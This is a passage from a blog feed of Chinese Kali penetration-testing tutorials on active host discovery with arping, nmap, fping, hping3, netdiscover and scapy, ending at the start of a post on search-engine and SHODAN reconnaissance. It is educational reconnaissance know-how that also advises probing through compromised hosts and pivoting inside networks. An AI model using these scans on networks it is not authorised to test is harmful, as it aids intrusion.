src="/2022/12/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E5%9B%9B%E5%B1%82%E3%80%91/image-20221211210012746.png" alt="image-20221211210012746"><ul><li><img src="/2022/12/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E5%9B%9B%E5%B1%82%E3%80%91/image-20221211210031563.png" alt="image-20221211210031563"></li></ul></li></ul></li></ul></li><li>nmap 1.1.1.1 -PO -sn   # 基于IP协议的ping<ul><li><img src="/2022/12/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E5%9B%9B%E5%B1%82%E3%80%91/image-20221211210632984.png" alt="image-20221211210632984"></li><li><img src="/2022/12/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E5%9B%9B%E5%B1%82%E3%80%91/image-20221211210712256.png" alt="image-20221211210712256"></li></ul></li><li>nmap -iL iplist.txt -PA80 -sn     # 地址列表扫描</li></ul><h2 id="Hping3"><a href="#Hping3" class="headerlink" title="Hping3"></a>Hping3</h2><ul><li>hping3 –udp 1.1.1.1 -c 1<ul><li>基于UDP的ping<ul><li><img src="/2022/12/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E5%9B%9B%E5%B1%82%E3%80%91/image-20221211211026009.png" alt="image-20221211211026009"></li></ul></li></ul></li><li>hping3 1.1.1.1 -c 1                   # 默认扫描TCP<ul><li>基于TCP的ping<ul><li><img src="/2022/12/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E5%9B%9B%E5%B1%82%E3%80%91/image-20221211211738117.png" alt="image-20221211211738117"></li></ul></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息搜集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息搜集 </tag>
            
            <tag> Kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali渗透测试-主动信息搜集【三层】</title>
      <link href="/2022/12/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E4%B8%89%E5%B1%82%E3%80%91/"/>
      <url>/2022/12/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E4%B8%89%E5%B1%82%E3%80%91/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="主动信息搜集—三层发现"><a href="#主动信息搜集—三层发现" class="headerlink" title="主动信息搜集—三层发现"></a>主动信息搜集—三层发现</h2><ul><li>优点<ul><li>可路由</li><li>速度比较快</li></ul></li><li>缺点<ul><li>速度比二层慢</li><li>经常被边界防火墙过滤</li></ul></li><li>IP、icmp协议</li></ul><h2 id="Ping"><a href="#Ping" class="headerlink" title="Ping"></a>Ping</h2><ul><li><p>ping 192.168.216.2 -c 5</p><ul><li><p>-c 指定发送5个包</p></li><li><p><img src="/2022/12/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E4%B8%89%E5%B1%82%E3%80%91/image-20221211100329274.png" alt="image-20221211100329274"></p></li></ul></li><li><p>ping -R 1.1.1.1      # -R 记录经过的路由</p><ul><li>-R参数记录的是离发送端远的端口地址（路由器右端口）</li></ul></li><li><p>traceroute 1.1.1.1</p><ul><li>记录的是离发送端近的端口地址（路由器左端口）</li></ul></li><li><p>ping 192.168.216.2 -c 1 | grep “bytes from” | cut -d “ “ -f 4 |cut -d “:” -f 1</p><ul><li><img src="/2022/12/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E4%B8%89%E5%B1%82%E3%80%91/image-20221211102243101.png" alt="image-20221211102243101"></li></ul></li></ul><h2 id="Scapy"><a href="#Scapy" class="headerlink" title="Scapy"></a>Scapy</h2><blockquote><p>使用scapy进行三层探测</p></blockquote><ul><li>将IP()赋值给i，将ICMP()赋值给p，再将<code>i</code>和<code>p</code>变量使用<code>/</code>组合起来赋值给ping：<code>ping=(i/p)</code><ul><li><img src="/2022/12/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E4%B8%89%E5%B1%82%E3%80%91/image-20221211111208126.png" alt="image-20221211111208126"></li><li>查看包头结构<ul><li><img src="/2022/12/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E4%B8%89%E5%B1%82%E3%80%91/image-20221211111305731.png" alt="image-20221211111305731"></li></ul></li><li>设置IP包头中的<code>dst</code>字段<ul><li><img src="/2022/12/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E4%B8%89%E5%B1%82%E3%80%91/image-20221211111429874.png" alt="image-20221211111429874"></li></ul></li><li>发包<ul><li><img src="/2022/12/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E4%B8%89%E5%B1%82%E3%80%91/image-20221211111550957.png" alt="image-20221211111550957"></li></ul></li><li>使用一行发包<ul><li><img src="/2022/12/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E4%B8%89%E5%B1%82%E3%80%91/image-20221211111802157.png" alt="image-20221211111802157"></li></ul></li><li>当主机不存活时加入<code>timeout</code>字段，防止scapy扫描中断<ul><li><img src="/2022/12/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E4%B8%89%E5%B1%82%E3%80%91/image-20221211112219627.png" alt="image-20221211112219627"></li></ul></li></ul></li></ul><h2 id="Nmap—三层发现"><a href="#Nmap—三层发现" class="headerlink" title="Nmap—三层发现"></a>Nmap—三层发现</h2><blockquote><p>nmap 192.168.182.0 -sn  </p><p>扫描三层网段还可以使用<code>-sn</code>参数，当宿主机处于同网段时会进行ARP的扫描，当宿主机处于不同网段时会进行ICMP的扫描</p></blockquote><ul><li>nmap 211.144.145.1 -sn   # 不同网段<ul><li><img src="/2022/12/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E4%B8%89%E5%B1%82%E3%80%91/image-20221211113642967.png" alt="image-20221211113642967"></li><li><img src="/2022/12/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E4%B8%89%E5%B1%82%E3%80%91/image-20221211113707886.png" alt="image-20221211113707886"></li></ul></li></ul><h2 id="fping"><a href="#fping" class="headerlink" title="fping"></a>fping</h2><blockquote><p>比 ping 功能强大一些，会给出响应时间，字段大小，丢包率等，支持地址段的 ping</p></blockquote><ul><li><p>fping 192.168.216.2 -c 10</p><ul><li><img src="/2022/12/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E4%B8%89%E5%B1%82%E3%80%91/image-20221211114140190.png" alt="image-20221211114140190"></li></ul></li><li><p>fping -g 192.168.216.100 192.168.216.200 -c 1  # 指定起始和结束的IP地址</p><ul><li><code>-g</code> 进行地址段的扫描，从<code>.100-.200</code>的扫描，每个地址发送一个包<ul><li><img src="/2022/12/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E4%B8%89%E5%B1%82%E3%80%91/image-20221211114511961.png" alt="image-20221211114511961"></li><li>loss 100%非存活主机，loss 0%存活主机</li></ul></li></ul></li><li><p>fping  -g 192.168.216.0&#x2F;24 | grep alive  # 添加子网掩码进行网段扫描</p><ul><li><img src="/2022/12/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E4%B8%89%E5%B1%82%E3%80%91/image-20221211115259699.png" alt="image-20221211115259699"></li></ul></li><li><p>fping -f iplist.txt</p><blockquote><ul><li>支持地址列表的方式</li></ul></blockquote></li></ul><h2 id="Hping"><a href="#Hping" class="headerlink" title="Hping"></a>Hping</h2><blockquote><p>能够发送几乎任意TCP&#x2F;IP包</p><p>功能强大但每次只能扫描一个目标</p></blockquote><ul><li>hping3 192.168.216.2 –icmp -c 2<ul><li><img src="/2022/12/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E4%B8%89%E5%B1%82%E3%80%91/image-20221211115751348.png" alt="image-20221211115751348"></li><li>通过循环实现网段扫描<ul><li>for addr in $(seq 1 254); do hping3 192.168.216.$addr –icmp -c 1 &gt;&gt; handle.txt &amp; done</li><li><img src="/2022/12/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E4%B8%89%E5%B1%82%E3%80%91/image-20221211120106849.png" alt="image-20221211120106849"></li><li>查看handle.txt并用<code>^</code>索引符，从开头进行索引<code>len</code>字段，筛选出活着的主机</li><li><img src="/2022/12/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E4%B8%89%E5%B1%82%E3%80%91/image-20221211120416425.png" alt="image-20221211120416425"></li><li><img src="/2022/12/11/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E4%B8%89%E5%B1%82%E3%80%91/image-20221211120158246.png" alt="image-20221211120158246"></li></ul></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息搜集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息搜集 </tag>
            
            <tag> Kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali渗透测试-主动信息搜集【二层】</title>
      <link href="/2022/12/10/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E4%BA%8C%E5%B1%82%E3%80%91/"/>
      <url>/2022/12/10/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E4%BA%8C%E5%B1%82%E3%80%91/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="主动信息搜集"><a href="#主动信息搜集" class="headerlink" title="主动信息搜集"></a>主动信息搜集</h2><blockquote><p>被动信息搜集可能搜集到的信息不是最新的信息，而是历史信息，由此，需要使用主动信息搜集对被动信息搜集得到的结果进行确认和验证，并且通过主动的手段发现更新，更准确，更完善的信息，以致于对后续渗透更有帮助。</p></blockquote><ul><li>直接与目标系统交互通信</li><li>无法避免留下访问的痕迹</li><li>使用受控的第三方电脑进行探测<ul><li>使用代理或已经被控制的主机</li><li>做好被封杀的准备</li><li>使用嗓声信息迷惑目标，淹没真实的探测流量</li></ul></li><li>扫描<ul><li>发送不同的探测，根据返回结果判断目标状态</li><li>IP层</li><li>端口层</li><li>服务层</li></ul></li></ul><h2 id="发现阶段"><a href="#发现阶段" class="headerlink" title="发现阶段"></a>发现阶段</h2><ul><li>识别存活主机<ul><li>潜在的被攻击目标</li></ul></li><li>输出一个IP地址列表</li><li>2、3、4层发现</li></ul><h2 id="发现—二层发现"><a href="#发现—二层发现" class="headerlink" title="发现—二层发现"></a>发现—二层发现</h2><ul><li>优点：扫描速度快、可靠</li><li>缺点：不可路由</li><li>Arp协议<ul><li>抓包</li></ul></li></ul><h3 id="Arping"><a href="#Arping" class="headerlink" title="Arping"></a>Arping</h3><ul><li>arping 192.168.216.2 -c 1  # -c 参数表示发送包的数量<ul><li>收包成功<ul><li><img src="/2022/12/10/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E4%BA%8C%E5%B1%82%E3%80%91/image-20221210101311801.png" alt="image-20221210101311801"></li></ul></li><li>收包失败<ul><li><img src="/2022/12/10/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E4%BA%8C%E5%B1%82%E3%80%91/image-20221210101359679.png" alt="image-20221210101359679"></li></ul></li><li>抓包<ul><li><img src="/2022/12/10/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E4%BA%8C%E5%B1%82%E3%80%91/image-20221210101646501.png" alt="image-20221210101646501"></li></ul></li></ul></li><li>arping 192.168.216.2 -d   # -d 发现重复的响应，发现两个不同的MAC地址，拥有同一个IP（可进行ARP欺骗，进行中间人攻击）<ul><li>arp<ul><li><img src="/2022/12/10/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E4%BA%8C%E5%B1%82%E3%80%91/image-20221210102242748.png" alt="image-20221210102242748"></li></ul></li></ul></li><li>arping -c 1 192.168.216.2 | grep “bytes from” | cut -d” “ -f 5 | cut -d”(“ -f 2 | cut -d”)” -f 1<ul><li>-c 1 只发送一个包；grep 匹配bytes from数据包；cut -d” “ -f 5通过空格进行筛选第5列的内容； cut -d”(“ -f 2 | cut -d”)” -f 1 通过括号进行筛选第2列和第1列的内容<ul><li><img src="/2022/12/10/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E4%BA%8C%E5%B1%82%E3%80%91/image-20221210104028235.png" alt="image-20221210104028235"></li></ul></li><li>arping -c 1 192.168.216.2 | grep “bytes from” <ul><li><img src="/2022/12/10/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E4%BA%8C%E5%B1%82%E3%80%91/image-20221210104102502.png" alt="image-20221210104102502"></li></ul></li><li>arping-c 1 192.168.216.2 | grep “bytes from” | cut -d” “ -f 5 <ul><li><img src="/2022/12/10/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E4%BA%8C%E5%B1%82%E3%80%91/image-20221210104133409.png" alt="image-20221210104133409"></li></ul></li><li>arping -c 1 192.168.216.2 | grep “bytes from” | cut -d” “ -f 5 | cut -d”(“ -f 2<ul><li><img src="/2022/12/10/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E4%BA%8C%E5%B1%82%E3%80%91/image-20221210104220530.png" alt="image-20221210104220530"></li></ul></li></ul></li></ul><blockquote><p>Arping只能ping一个目标的IP地址，不能ping一个网段，例如：192.168.216.0&#x2F;24这样的网段是不支持扫描的，因此使用arping的shell脚本来实现对于网段的扫描</p></blockquote><p>由于从Windows下编写的shell脚本，执行时会提示”bad interpreter:No such file or directory“错误，是文件格式的问题。</p><p>文章地址：<a href="http://www.kaotop.com/it/37690.html">http://www.kaotop.com/it/37690.html</a></p><p>解决方法：</p><p>vim filename</p><p>在使用set ff&#x3D;unix强制转换为unix格式，存盘退出即可：</p><p><img src="/2022/12/10/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E4%BA%8C%E5%B1%82%E3%80%91/image-20221210114809030.png" alt="image-20221210114809030"></p><ul><li>使用arping脚本实现网段扫描<ul><li>.&#x2F;arping1.sh eth0<ul><li><img src="/2022/12/10/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E4%BA%8C%E5%B1%82%E3%80%91/image-20221210115501471.png" alt="image-20221210115501471"></li></ul></li><li>抓包可以看到在扫描整个网段<ul><li><img src="/2022/12/10/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E4%BA%8C%E5%B1%82%E3%80%91/image-20221210115306243.png" alt="image-20221210115306243"></li></ul></li><li>以文件的形式输出<ul><li><img src="/2022/12/10/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E4%BA%8C%E5%B1%82%E3%80%91/image-20221210120525109.png" alt="image-20221210120525109"></li></ul></li><li>调用文件的IP进行探测，文件中存在存活IP则输出<ul><li><img src="/2022/12/10/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E4%BA%8C%E5%B1%82%E3%80%91/image-20221210120649864.png" alt="image-20221210120649864"></li></ul></li></ul></li></ul><h3 id="Nmap—二层发现"><a href="#Nmap—二层发现" class="headerlink" title="Nmap—二层发现"></a>Nmap—二层发现</h3><ul><li><p>nmap -sn 192.168.216.2</p><pre class="line-numbers language-none"><code class="language-none">-sn 不做端口扫描，只做二层的发现可支持地址段的扫描(速度快，内容多):<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><ul><li><p>nmap -sn 192.168.216.0&#x2F;24</p></li><li><p><img src="/2022/12/10/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E4%BA%8C%E5%B1%82%E3%80%91/image-20221210122302578.png" alt="image-20221210122302578"></p></li><li><p>nmap -iL iplist.txt -sn</p></li><li><pre><code>-iL 调用地址列表中的地址进行扫描</code></pre></li></ul></li><li><p>nmap -sn参数不只是对Arp进行查询</p><ul><li><p>抓包</p><ul><li><p><img src="/2022/12/10/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E4%BA%8C%E5%B1%82%E3%80%91/image-20221210123028936.png" alt="image-20221210123028936"></p></li><li><blockquote><p>nmap使用-sn进行arp扫描时，还会进行域名解析，查询PTR记录</p></blockquote></li></ul></li></ul></li></ul><h3 id="Netdiscover"><a href="#Netdiscover" class="headerlink" title="Netdiscover"></a>Netdiscover</h3><blockquote><p>可以使用于主动发现，也可以使用于被动发现</p><ol><li>专用于二层发现</li><li>可用于无线和交换网络环境</li><li>主动和被动探测</li></ol></blockquote><ul><li><p>主动发现</p><ul><li>netdiscover -i eth0 -r 192.168.216.0&#x2F;24<ul><li><img src="/2022/12/10/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E4%BA%8C%E5%B1%82%E3%80%91/image-20221210172053819.png" alt="image-20221210172053819"></li><li><img src="/2022/12/10/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E4%BA%8C%E5%B1%82%E3%80%91/image-20221210172125761.png" alt="image-20221210172125761"></li></ul></li><li>netdiscover -l iplist.txt  # 也可以使用IP地址列表进行探测</li></ul></li><li><p>被动</p><ul><li><p>原理：不主动发arp包，只是默默侦听，将网卡置为混杂模式，收取非本网卡IP和MAC地址的数据包，只要网络中某一台机器发了广播包，就可以侦听到这个数据包。（主动arp容易被入侵检测等设备触发报警）</p></li><li><p>netdiscover -p</p><ul><li><p><img src="/2022/12/10/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E4%BA%8C%E5%B1%82%E3%80%91/image-20221210172316272.png" alt="image-20221210172316272"></p></li><li><p>上图中的<code>passive</code>就是被动式扫描</p></li></ul></li><li><p>触发一个ARP包</p><ul><li><img src="/2022/12/10/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E4%BA%8C%E5%B1%82%E3%80%91/image-20221210172740098.png" alt="image-20221210172740098"></li></ul></li></ul></li></ul><h3 id="Scapy"><a href="#Scapy" class="headerlink" title="Scapy"></a>Scapy</h3><blockquote><p>作为Python库进行调用</p><p>也可作为单独的工具使用</p><p>抓包、分析、创建、修改、注入网络流量</p></blockquote><ul><li><p>Scapy</p><ul><li><p>Scapy中集成大量函数，调用时需要大写</p></li><li><p>ARP().display()</p><ul><li><img src="/2022/12/10/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E4%BA%8C%E5%B1%82%E3%80%91/image-20221210173609579.png" alt="image-20221210173609579"></li><li>直接一行输出指令</li><li>sr1(ARP(pdst&#x3D;”192.168.216.2”))</li><li><img src="/2022/12/10/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E4%BA%8C%E5%B1%82%E3%80%91/image-20221210181108246.png" alt="image-20221210181108246"></li></ul></li><li><p>定义变量调用函数</p><ul><li>arp&#x3D;ARP()</li><li><img src="/2022/12/10/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E4%BA%8C%E5%B1%82%E3%80%91/image-20221210174208672.png" alt="image-20221210174208672"></li><li>arp.pdst&#x3D;”192.168.216.2”      # 将目标地址属性字段进行赋值</li><li><img src="/2022/12/10/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E4%BA%8C%E5%B1%82%E3%80%91/image-20221210174330131.png" alt="image-20221210174330131"></li></ul></li><li><p>sr1()     # 定义好相关参数之后使用Sr1()函数进行发包</p><ul><li>接收到应答包</li><li><img src="/2022/12/10/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E4%BA%8C%E5%B1%82%E3%80%91/image-20221210174710363.png" alt="image-20221210174710363"></li></ul></li><li><p>answer&#x3D;sr1(arp)    # 将应答包赋给一个变量<code>answer</code>，调用<code>answer.display()</code>显示包结构和内容 </p><ul><li><img src="/2022/12/10/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E4%BA%8C%E5%B1%82%E3%80%91/image-20221210175042440-1670665905139-1.png" alt="image-20221210175042440"></li></ul></li></ul></li></ul><p>*<em>注：当scapy请求一个不存在的IP是会一直不停的发包，知道该IP接收到为止，这种情况，以至于某一个IP不存在导致后续扫描无法正常进行，由此需要加一个超时时间timeout&#x3D;<em>s，参数verbose&#x3D;1表示将详细的报错信息也显示出来，verbose&#x3D;0则不显示。</em></em></p><ul><li>使用一个不存在的IP进行扫描<ul><li><img src="/2022/12/10/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E4%BA%8C%E5%B1%82%E3%80%91/image-20221210181935030.png" alt="image-20221210181935030"></li><li>加入<code>timeout</code>字段和<code>verbose</code>字段<ul><li><img src="/2022/12/10/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E4%BA%8C%E5%B1%82%E3%80%91/image-20221210182356926.png" alt="image-20221210182356926"></li></ul></li></ul></li></ul><h2 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h2><p>二层发现一般是已经拿到一台机器的控制权，要对内网进行渗透，需要用二层工具获取内网其他的存活主机进行进一步渗透，拿下更多的主机。</p>]]></content>
      
      
      <categories>
          
          <category> 信息搜集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息搜集 </tag>
            
            <tag> Kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali渗透测试-被动信息搜集【搜索引擎篇】</title>
      <link href="/2022/12/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E7%AF%87%E3%80%91/"/>
      <url>/2022/12/06/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E8%A2%AB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%90%9C%E7%B4%A2%E5%BC%95%E6%93%8E%E7%AF%87%E3%80%91/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a>搜索引擎</h2><p>利用Hacking语法进行信息搜集：</p><ul><li>公司新闻动态</li><li>重要雇员信息</li><li>机密文档&#x2F;网络拓扑<ul><li>搜索引擎会爬取任何数据，尽管没有对外公布</li></ul></li><li>用户名密码</li><li>目标系统软硬件技术架构<ul><li>搜索引擎获取Banner信息，了解其架构</li></ul></li></ul><h2 id="SHODAN"><a href="#SHODAN" class="headerlink" title="SHODAN"></a>SHODAN</h2><ul><li>搜索联网设备</li><li>Banner：http、ftp、ssh、telent</li><li><a href="http://www.shodan.io/">http://www.shodan.io</a></li><li>常见filter:<ul><li>net（x.x.x.x）<ul><li><img 